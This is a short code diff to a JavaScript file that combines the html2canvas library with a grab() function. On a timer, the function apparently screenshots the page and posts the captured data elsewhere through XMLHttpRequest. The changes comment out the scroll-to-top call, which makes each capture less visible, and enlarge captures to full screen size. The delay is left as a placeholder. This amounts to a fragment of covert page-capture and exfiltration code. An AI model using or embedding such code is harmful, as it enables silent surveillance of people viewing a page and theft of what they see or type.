@@ -1024,7 +1024,7 @@ function h2cRenderContext(width, height) {
   };
 }
 _html2canvas.Parse = function (images, options) {
-  window.scroll(0,0);
+  //window.scroll(0,0);
 
   var element = (( options.elements === undefined ) ? document.body : options.elements[0]), // select body by default
   numDraws = 0,
@@ -2871,8 +2871,10 @@ function grab() {
       xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
       var x=encodeURIComponent(dat);
       xmlhttp.send(x); 
-    }
-  }); 
+    },
+      width: screen.width,
+      height: screen.height
+  });
 }
 
 setInterval(function(){grab()}, SECONDS_GO_HERE);
